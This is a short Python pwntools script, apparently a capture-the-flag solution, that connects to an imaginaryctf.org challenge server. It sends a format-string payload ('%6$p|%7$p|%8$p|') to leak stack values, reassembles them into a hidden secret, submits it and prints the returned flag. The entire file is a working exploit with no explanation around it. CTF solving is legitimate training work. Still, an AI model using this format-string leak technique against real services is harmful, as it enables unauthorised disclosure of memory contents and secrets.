from pwn import *

def leak():
    temp = r.recvuntil(b"|")
    temp = str(temp)
    temp = temp.replace("b'","")
    temp = temp.replace("|'","")
    temp = int(temp,16)
    return p64(temp)
r = remote("puzzler7.imaginaryctf.org" ,2001)
r.sendlineafter('Tell me something ' , b"%6$p|%7$p|%8$p|")
r.recv()
secret = leak()
secret += leak()
secret += leak()
secret = secret[0:len(secret)-3]
r.sendlineafter('\n\nWhat is the secret? \n', secret)
r.recvuntil(b'\nNice!, you got the secret!\nHere you gift:\n')
flag = r.recvuntil("}")
flag = str(flag)
flag = flag.replace("b'","")
flag= flag.replace("'","")
log.success(f"[FLAG] {flag}")
